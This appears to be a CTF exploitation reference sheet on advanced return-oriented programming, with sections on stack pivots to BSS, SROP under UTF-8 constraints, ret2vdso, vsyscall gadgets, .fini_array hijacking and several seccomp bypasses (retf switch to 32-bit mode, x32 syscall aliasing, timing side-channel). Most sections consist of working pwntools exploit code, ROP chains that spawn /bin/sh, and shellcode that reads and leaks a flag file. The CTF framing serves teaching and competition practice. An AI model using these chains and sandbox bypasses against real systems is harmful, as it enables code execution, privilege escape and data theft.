# CTF Pwn - Advanced ROP Techniques

## Table of Contents
- [Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)](#double-stack-pivot-to-bss-via-leaveret-midnightflag-2026)
- [SROP with UTF-8 Payload Constraints (DiceCTF 2026)](#srop-with-utf-8-payload-constraints-dicectf-2026)
- [Seccomp Bypass](#seccomp-bypass)
- [RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)](#retf-architecture-switch-for-seccomp-bypass-midnightflag-2026)
- [Stack Shellcode with Input Reversal](#stack-shellcode-with-input-reversal)
- [.fini_array Hijack](#fini_array-hijack)
- [pwntools Template](#pwntools-template)
  - [Automated Offset Finding via Corefile (Crypto-Cat)](#automated-offset-finding-via-corefile-crypto-cat)
- [ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)](#ret2vdso--using-kernel-vdso-gadgets-htb-nowhere-to-go)
  - [Step 1 — Stack leak](#step-1--stack-leak)
  - [Step 2 — Write `/bin/sh` to known address](#step-2--write-binsh-to-known-address)
  - [Step 3 — Find vDSO base via AT_SYSINFO_EHDR](#step-3--find-vdso-base-via-at_sysinfo_ehdr)
  - [Step 4 — Dump vDSO and find gadgets](#step-4--dump-vdso-and-find-gadgets)
  - [Step 5 — execve ROP chain](#step-5--execve-rop-chain)
- [Vsyscall ROP for PIE Bypass (Hack.lu 2015)](#vsyscall-rop-for-pie-bypass-hacklu-2015)
- [x32 ABI Syscall Number Aliasing for Seccomp Bypass (BCTF 2017)](#x32-abi-syscall-number-aliasing-for-seccomp-bypass-bctf-2017)
- [Time-Based Blind Shellcode When write() Blocked (DEF CON 2017)](#time-based-blind-shellcode-when-write-blocked-def-con-2017)
- [Useful Commands](#useful-commands)

For core ROP chain building, ret2csu, bad character bypass, exotic gadgets, and stack pivot via xchg, see [rop-and-shellcode.md](rop-and-shellcode.md).

---

## Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)

**Pattern (Eyeless):** Small stack overflow (22 bytes past buffer) — enough to overwrite RBP + RIP but too small for a ROP chain. No libc leak available. Use two `leave; ret` pivots to relocate execution to BSS, then chain `fgets` calls to write arbitrary-length ROP.

**Stage 1 — Pivot to BSS:**
```python
BSS_STAGE = 0x404500  # writable BSS address
LEAVE_RET = 0x4013d9  # leave; ret gadget

# Overflow: 128-byte buffer + RBP + RIP
payload = b'A' * 128
payload += p64(BSS_STAGE)   # overwrite RBP → BSS
payload += p64(LEAVE_RET)   # leave sets RSP = RBP (BSS), then ret
```

**Stage 2 — Chain fgets for large ROP:**
```python
# After pivot, RSP is at BSS_STAGE. Pre-place a mini-ROP there that
# calls fgets(BSS+0x600, 0x700, stdin) to read the real ROP chain:
POP_RDI = 0x4013a5
POP_RSI_R15 = 0x4013a3
SET_RDX_STDIN = 0x40136a  # gadget that sets rdx = stdin FILE*

stage2 = flat(
    SET_RDX_STDIN,
    POP_RDI, BSS_STAGE + 0x100,  # destination buffer
    POP_RSI_R15, 0x700, 0,       # size
    elf.plt['fgets'],             # fgets(buf, 0x700, stdin)
    BSS_STAGE + 0x100,            # return into the new ROP chain
)
```

**Key insight:** `leave; ret` is equivalent to `mov rsp, rbp; pop rbp; ret`. Overwriting RBP controls where RSP lands after `leave`. Two pivots solve the "too small for ROP" problem: first pivot moves to BSS where a small bootstrap ROP calls `fgets` to load the full exploit.

**When to use:** Overflow is too small for a full ROP chain AND the binary uses `fgets`/`read` (or similar input function) that can be called via PLT. BSS is always writable and at a known address (no PIE or PIE leaked).

---

## SROP with UTF-8 Payload Constraints (DiceCTF 2026)

**Pattern (Message Store):** Rust binary where OOB color index reads memcpy from GOT, causing `memcpy(stack, BUFFER, 0x1000)` — a massive stack overflow. But `from_utf8_lossy()` validates the buffer first: any invalid UTF-8 triggers `Cow::Owned` with corrupted replacement data. **The entire 0x1000-byte payload must be valid UTF-8.**

**Why SROP:** Normal ROP gadget addresses contain bytes >0x7f which are invalid single-byte UTF-8. SROP needs only 3 gadgets (set rax=15, call syscall) to trigger `sigreturn`, then a signal frame sets ALL registers for `execve("/bin/sh", NULL, NULL)`.

**UTF-8 multi-byte spanning trick:** Register fields in the signal frame are 8 bytes each, packed contiguously. A 3-byte UTF-8 sequence can start in one field and end in the next:

```python
from pwn import *

# r15 is the field immediately before rdi in the sigframe
# rdi = pointer to "/bin/sh" = 0x2f9fb0 → bytes [B0, 9F, 2F, ...]
# B0, 9F are UTF-8 continuation bytes (10xxxxxx) — invalid as sequence start
# Solution: set r15's last byte to 0xE0 (3-byte UTF-8 leader)
# E0 B0 9F = valid UTF-8 (U+0C1F) spanning r15→rdi boundary

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = buf_addr + 0x178  # address of "/bin/sh\0"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.r15 = 0xE000000000000000  # Last byte 0xE0 starts 3-byte UTF-8 seq

# ROP preamble: 3 UTF-8-safe gadgets
payload = b'\x00' * 0x48           # padding to return address
payload += p64(pop_rax_ret)        # set rax = 15 (sigreturn)
payload += p64(15)
payload += p64(syscall_ret)        # trigger sigreturn
payload += bytes(frame)
# Place "/bin/sh\0" at offset 0x178 in BUFFER
```

**When to use:** Any exploit where payload bytes pass through UTF-8 validation (Rust `String`, `from_utf8`, JSON parsers). SROP minimizes the number of gadget addresses that must be UTF-8-safe.

**Key insight:** Multi-byte UTF-8 sequences (2-4 bytes) can span adjacent fields in structured data (signal frames, ROP chains). Set the leader byte (0xC0-0xF7) as the last byte of one field so continuation bytes (0x80-0xBF) in the next field form a valid sequence.

## Seccomp Bypass

Alternative syscalls when seccomp blocks `open()`/`read()`:
- `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`

**Check rules:** `seccomp-tools dump ./binary`

See [advanced.md](advanced.md) for: conditional buffer address restrictions, shellcode construction without relocations (call/pop trick), seccomp analysis from disassembly, `scmp_arg_cmp` struct layout.

## RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)

**Pattern (Eyeless):** Seccomp blocks `execve`, `execveat`, `open`, `openat` in 64-bit mode. Switch to 32-bit (IA-32e compatibility mode) where syscall numbers differ and the filter does not apply.

**How it works:** The `retf` (far return) instruction pops RIP then CS from the stack. Setting `CS = 0x23` switches the CPU to 32-bit compatibility mode. In 32-bit mode, `int 0x80` uses different syscall numbers: `open=5`, `read=3`, `write=4`, `exit=1`.

**ROP chain to switch modes:**
```python
POP_RDX_RBX = libc_base + 0x8f0c5  # pop rdx; pop rbx; ret
POP_RDI     = 0x4013a5
POP_RSI_R15 = 0x4013a3
RETF        = libc_base + 0x294bf   # retf gadget in libc

# Step 1: mprotect BSS as RWX for shellcode
rop  = flat(POP_RDI, 0x404000)          # addr = BSS page
rop += flat(POP_RSI_R15, 0x1000, 0)     # size = page
rop += flat(POP_RDX_RBX, 7, 0)          # prot = RWX
rop += flat(libc_base + libc.sym.mprotect)

# Step 2: Far return to 32-bit shellcode on BSS
rop += flat(RETF)
rop += p32(0x404a80)   # 32-bit EIP (shellcode address on BSS)
rop += p32(0x23)        # CS = 0x23 (IA-32e compatibility mode)
```

**32-bit shellcode (open/read/write flag):**
```nasm
mov esp, 0x404100       ; set up 32-bit stack
push 0x67616c66         ; "flag" (reversed)
push 0x2f2f2f2f         ; "////"
mov ebx, esp            ; ebx = filename pointer

mov eax, 5              ; SYS_open (32-bit)
xor ecx, ecx            ; O_RDONLY
int 0x80                ; open("////flag", O_RDONLY)

mov ebx, eax            ; fd from open
mov ecx, esp            ; buffer
mov edx, 0x100          ; size
mov eax, 3              ; SYS_read (32-bit)
int 0x80

mov edx, eax            ; bytes read
mov ecx, esp            ; buffer
mov ebx, 1              ; stdout
mov eax, 4              ; SYS_write (32-bit)
int 0x80

mov eax, 1              ; SYS_exit
int 0x80
```

**Key insight:** Seccomp filters configured for `AUDIT_ARCH_X86_64` do not check 32-bit `int 0x80` syscalls. The `retf` gadget (found in libc) switches architecture by loading CS=0x23. Requires making a memory region executable first via `mprotect`, since 32-bit shellcode must run from writable+executable memory.

**Finding retf in libc:**
```bash
ROPgadget --binary libc.so.6 | grep retf
# Or search for byte 0xcb:
objdump -d libc.so.6 | grep -w retf
```

**When to use:** Seccomp blocks critical 64-bit syscalls (`open`, `openat`, `execve`) but does not use `SECCOMP_FILTER_FLAG_SPEC_ALLOW` or check `AUDIT_ARCH`. Combine with `mprotect` to make BSS/heap executable for the 32-bit shellcode.

---

## Stack Shellcode with Input Reversal

**Pattern (Scarecode):** Binary reverses input buffer before returning.

**Strategy:**
1. Leak address via info-leak command (bypass PIE)
2. Find `sub rsp, 0x10; jmp *%rsp` gadget
3. Pre-reverse shellcode and RIP overwrite bytes
4. Use partial 6-byte RIP overwrite (avoids null bytes from canonical addresses)
5. Place trampoline (`jmp short`) to hop back into NOP sled + shellcode

**Null-byte avoidance with `scanf("%s")`:**
- Can't embed `\x00` in payload
- Use partial pointer overwrite (6 bytes) -- top 2 bytes match since same mapping
- Use short jumps and NOP sleds instead of multi-address ROP chains

## .fini_array Hijack

**When to use:** Writable `.fini_array` + arbitrary write primitive. When `main()` returns, entries called as function pointers. Works even with Full RELRO.

```python
# Find .fini_array address
fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
# Or: objdump -h binary | grep fini_array

# Overwrite with format string %hn (2-byte writes)
writes = {
    fini_array: target_addr & 0xFFFF,
    fini_array + 2: (target_addr >> 16) & 0xFFFF,
}
```

**Advantages over GOT overwrite:** Works even with Full RELRO (`.fini_array` is in a different section). Especially useful when combined with RWX regions for shellcode.

## pwntools Template

```python
from pwn import *

context.binary = elf = ELF('./binary')
context.log_level = 'debug'

def conn():
    if args.GDB:
        return gdb.debug([exe], gdbscript='init-pwndbg\ncontinue')
    elif args.REMOTE:
        return remote('host', port)
    return process('./binary')

io = conn()
# exploit here
io.interactive()
```

### Automated Offset Finding via Corefile (Crypto-Cat)

Automatically determine buffer overflow offset without manual `cyclic -l`:
```python
def find_offset(exe):
    p = process(exe, level='warn')
    p.sendlineafter(b'>', cyclic(500))
    p.wait()
    # x64: read saved RIP from stack pointer
    offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    # x86: use pc directly
    # offset = cyclic_find(p.corefile.pc)
    log.warn(f'Offset: {offset}')
    return offset
```

**Key insight:** pwntools auto-generates a core file from the crashed process. Reading the saved return address from `corefile.sp` (x64) or `corefile.pc` (x86) and passing it to `cyclic_find()` gives the exact offset. Eliminates manual GDB inspection.

## ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)

**Pattern:** Statically-linked binary with minimal functions and zero useful ROP gadgets (no `pop rdi`, `pop rsi`, `pop rax`, etc.). The Linux kernel maps a vDSO (Virtual Dynamic Shared Object) into every process, and it contains enough gadgets for `execve`.

### Step 1 — Stack leak

Overflow a buffer and read back more bytes than sent to leak stack pointers:
```python
p.send(b'A' * 0x20)
resp = p.recv(0x80)
leak = u64(resp[0x30:0x38])
stackbase = (leak & 0x0000FFFFFFFFF000) - 0x20000
```

### Step 2 — Write `/bin/sh` to known address

Use the binary's own `read` function via ROP to place `/bin/sh\0` at a page-aligned stack address:
```python
payload = b'B' * 32 + p64(READ_FUNC) + p64(LOOP) + p64(0x8) + p64(stackbase)
p.sendline(payload)
p.send(b'/bin/sh\x00')
```

### Step 3 — Find vDSO base via AT_SYSINFO_EHDR

Dump the stack using the binary's `write` function. Search for `AT_SYSINFO_EHDR` (auxv type `0x21`) which holds the vDSO base address:
```python
# Dump 0x21000 bytes from stackbase
for i in range(0, len(stackdump) - 15, 8):
    val = u64(stackdump[i:i+8])
    if val == 0x21:  # AT_SYSINFO_EHDR
        next_val = u64(stackdump[i+8:i+16])
        if 0x7f0000000000 <= next_val <= 0x7fffffffffff and (next_val & 0xFFF) == 0:
            vdso_base = next_val
            break
```

### Step 4 — Dump vDSO and find gadgets

Dump 0x2000 bytes from `vdso_base` using the binary's `write` function, then search for gadgets. Common vDSO gadgets:
```python
POP_RDX_RAX_RET     = vdso_base + 0xba0  # pop rdx; pop rax; ret
POP_RBX_R12_RBP_RET = vdso_base + 0x8c6  # pop rbx; pop r12; pop rbp; ret
MOV_RDI_RBX_SYSCALL = vdso_base + 0x8e3  # mov rdi, rbx; mov rsi, r12; syscall
```

### Step 5 — execve ROP chain

```python
payload = b'A' * 32
payload += p64(POP_RDX_RAX_RET)
payload += p64(0x0)              # rdx = NULL (envp)
payload += p64(59)               # rax = execve
payload += p64(POP_RBX_R12_RBP_RET)
payload += p64(stackbase)        # rbx → rdi = &"/bin/sh"
payload += p64(0x0)              # r12 → rsi = NULL (argv)
payload += p64(0xdeadbeef)       # rbp (dummy)
payload += p64(MOV_RDI_RBX_SYSCALL)
```

**Key insight:** The vDSO is kernel-specific — different kernels have different gadget offsets. Always dump the remote vDSO rather than assuming local offsets. The auxv `AT_SYSINFO_EHDR` (type 0x21) on the stack is the reliable way to find the vDSO base address.

**Detection:** Statically-linked binary with few functions, no libc, and no useful gadgets. QEMU-hosted challenges often run custom kernels with unique vDSO layouts.

---

## Vsyscall ROP for PIE Bypass (Hack.lu 2015)

On older Linux kernels, vsyscall page is mapped at a fixed address (`0xffffffffff600000-0xffffffffff601000`) regardless of ASLR/PIE. Each vsyscall entry ends with `ret`, providing gadgets at known addresses:

- `0xffffffffff600000` — gettimeofday (ret at +0x9)
- `0xffffffffff600400` — time (ret at +0x9)
- `0xffffffffff600800` — getcpu (ret at +0x9)

Use vsyscall `ret` gadgets to slide the stack to a partial return address overwrite:

```python
from pwn import *

payload = b'A' * 72                      # padding to return address
payload += p64(0xffffffffff600400)        # vsyscall time: acts as NOP-ret
payload += p64(0xffffffffff600400)        # second NOP-ret for alignment
payload += b"\x8b\x10"                    # partial overwrite to target (2 bytes)
```

**Key insight:** Vsyscall addresses are fixed even with PIE+ASLR. Modern kernels emulate vsyscalls (trap to kernel), but the addresses remain predictable. Check with `cat /proc/self/maps | grep vsyscall`.

**Note:** Some newer kernels disable vsyscall entirely (`vsyscall=none`). Verify availability before relying on this technique.

---

## x32 ABI Syscall Number Aliasing for Seccomp Bypass (BCTF 2017)

**Pattern:** Linux x32 ABI (32-bit pointers on 64-bit kernel) uses syscall numbers with bit 30 set (`0x40000000`). Most seccomp BPF filters only check the low 32 bits against known syscall numbers, missing the x32 variants.

```c
// Standard execve blocked by seccomp: syscall 59
// x32 ABI variant: syscall 0x40000000 | 59 = 0x4000003B
// Often passes through BPF filters that check for exact match on 59
syscall(0x4000003B, "/bin/sh", NULL, NULL);
```

```python
from pwn import *

# ROP chain using x32 ABI syscall number to bypass seccomp
pop_rax = libc_base + rax_gadget
pop_rdi = libc_base + rdi_gadget
pop_rsi = libc_base + rsi_gadget
pop_rdx = libc_base + rdx_gadget
syscall_ret = libc_base + syscall_gadget

rop = flat(
    pop_rax, 0x4000003B,              # x32 execve (bypasses seccomp)
    pop_rdi, binsh_addr,              # "/bin/sh"
    pop_rsi, 0,                       # argv = NULL
    pop_rdx, 0,                       # envp = NULL
    syscall_ret,                      # trigger x32 execve
)
```

**Key insight:** The x32 ABI ORs `0x40000000` into syscall numbers. Seccomp filters checking for `SCMP_ACT_KILL` on `__NR_execve` (59) miss `__NR_execve | __X32_SYSCALL_BIT` (0x4000003B), which the kernel still dispatches to the same handler. This works on kernels compiled with `CONFIG_X86_X32=y` (common on older distributions).

**When to recognize:** Seccomp filter blocks specific syscall numbers via exact match or range check. Dump the BPF with `seccomp-tools dump ./binary` and check whether it validates the `AUDIT_ARCH` or masks off the x32 bit before comparing. If neither, x32 aliasing bypasses the filter.

**Mitigation check:** Modern seccomp policies use `SECCOMP_RET_KILL_PROCESS` and verify `AUDIT_ARCH_X86_64` explicitly, blocking this technique.

**References:** BCTF 2017

---

## Time-Based Blind Shellcode When write() Blocked (DEF CON 2017)

**Pattern:** When seccomp blocks all output syscalls (`write`, `sendto`, `writev`), use a timing side-channel to exfiltrate flag data character-by-character: compare each byte against a guess, loop on match.

```nasm
; Read flag into buffer, then compare character N
; Assumes flag has been read into rsi via allowed read() syscall
mov al, [rsi + N]      ; flag byte N
cmp al, 0x41           ; compare with guess 'A'
jne done               ; skip if no match
; Timing loop: burns ~4 seconds on match
xor ecx, ecx
.loop: inc ecx
cmp ecx, 0xffffffff
jne .loop
done: xor edi, edi
mov eax, 60            ; exit
syscall
```

```python
from pwn import *
import time

FLAG_LEN = 40
CHARSET = string.printable

def guess_byte(offset, guess_char):
    """Send shellcode that delays if flag[offset] == guess_char"""
    sc = shellcraft.amd64.linux.open("flag.txt", 0)
    sc += shellcraft.amd64.linux.read("rax", "rsp", 100)
    sc += f"""
        mov al, byte ptr [rsp + {offset}]
        cmp al, {ord(guess_char)}
        jne done
        xor ecx, ecx
    loop:
        inc ecx
        cmp ecx, 0xffffffff
        jne loop
    done:
        xor edi, edi
        mov eax, 60
        syscall
    """
    r = remote(host, port)
    r.send(asm(sc))
    start = time.time()
    try:
        r.recvall(timeout=6)
    except:
        pass
    elapsed = time.time() - start
    r.close()
    return elapsed > 3.0  # Match if response took > 3 seconds

flag = ""
for i in range(FLAG_LEN):
    for c in CHARSET:
        if guess_byte(i, c):
            flag += c
            print(f"Flag so far: {flag}")
            break
```

**Key insight:** When seccomp blocks all output syscalls (`write`, `sendto`, `writev`), a flag byte can still be exfiltrated by comparing it against a guessed value and burning CPU time on match. The response time difference (instant vs ~4 seconds) reveals whether the guess was correct. Requires up to 256 * flag_length connections worst case, but printable ASCII reduces this to ~95 * flag_length.

**When to recognize:** Seccomp allows `open`/`read` but blocks all write-family syscalls. Also applicable when the binary has no output path at all (e.g., embedded systems, bare-metal challenges).

**References:** DEF CON 2017

---

## Useful Commands

```bash
one_gadget libc.so.6           # Find one-shot gadgets
ropper -f binary               # Find ROP gadgets
ROPgadget --binary binary      # Alternative gadget finder
seccomp-tools dump ./binary    # Check seccomp rules
```
